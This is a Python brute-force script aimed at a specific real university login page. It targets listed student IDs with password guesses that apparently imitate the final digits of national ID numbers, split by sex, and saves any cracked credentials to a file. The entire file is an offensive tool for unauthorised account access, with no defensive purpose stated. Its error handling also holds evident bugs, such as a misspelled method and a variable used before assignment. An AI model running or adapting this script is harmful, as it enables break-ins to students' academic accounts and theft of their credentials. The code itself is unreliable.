#! /usr/bin/env python3
# -*- coding:utf-8 -*-

'''

This program is for blasting 59.77.226.32 using the method of ergodic.
You can also user your own dictionary by adding the abspath of the dictionary.
You should tell program which user you want to blast by adding the abspath of the SQL.txt
for example:
user: 011501101 sex: male(or female)
user: 011501102 sex: female

'''

import os, re, time
from urllib import request, parse, error

def MaleDictionary():
	for x in range(1, 32):
		for y in range(100):
			for z in range(1, 10, 2):
				for w in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'X'):
					yield (format(x, '02d') + format(y, '02d') + str(z) + w)

def FemaleDictionary():
	for x in range(1, 32):
		for y in range(100):
			for z in range(0, 10, 2):
				for w in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'X'):
					yield (format(x, '02d') + format(y, '02d') + str(z) + w)



def Blasting():

	url = 'http://59.77.226.32/logincheck.asp'
	head = {
		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
		'Accept': 'text/html',
		'Accept-Encoding': 'gzip, deflate',
		'Referer': 'http://jwch.fzu.edu.cn/'
	}
	data = {'Content-Type': 'application/x-www-form-urlencoded', 'muser': '', 'passwd': '', 'x': '0', 'y': '0'}
	re_pass = re.compile('福州大学教务处本科教学管理系统')
	re_user = re.compile('^user:\s*(\d{9})\s*sex:\s*(male|female)$')

	def Blast(buser, bpasswd):
		for user in buser:
			data['muser'] = user
			for x in bpasswd:
				data['passwd'] = x
				req = request.Request(url, headers = head)
				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
				time.sleep(0.01)
				try :
					response = request.urlopen(req, data = parse.urlencode(data).encode('gbk'))	
				except error.HTTPError as e:
					req = request.Ruequest(response.geturl(), headers = head)
					response = request.urlopen(req, data = parse.urlencode(data).encode('gbk'))
				except error.URLError as e:
					time.sleep(10)
					response = request.urlopen(req, data = parse.urlencode(data).encode('gbk'))
				except Exception as e:
					print(response.getcode())
					time.sleep(10)					
					#pass
				if re_pass.search(response.read().decode(encoding = 'gbk', errors = 'ignore')):
					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
					r.flush()
					print('Get the password of user: %s' % user)
					fuser.remove(user)
					break

	muser = []
	fuser = []
	DBpath = input('Please enter the abspath of the Database: ')
	d = open(DBpath)
	for x in d.readlines() 	:
		y = re_user.match(x)
		if y.group(2) == 'male':
			muser.append(y.group(1))
		else :
			fuser.append(y.group(1))
	d.close()

	dictpath = input('Please enter the abspath of your dictionary(or press enter): ')	
	t = -1
	passwd = []
	if dictpath != '':
		t = input('1: Only using dictionary given for blasting;\n2: if dictionary is useless, traverse.\n enter your choice: ')
		d = open(dictpath)
		for x in d.readlines()[:-1] :
			passwd.append(x)

	path = os.path.abspath('.')
	r = open(path + '/BlastingResult.txt', 'a')

	if t != -1:
		Blast(muser, passwd)
		Blast(fuser, passwd)
	if t != 1:
		Blast(muser, MaleDictionary())
		Blast(fuser, FemaleDictionary())

	r.close()

if __name__ == '__main__':

	print('Welcome to Blasting......')
	Blasting()
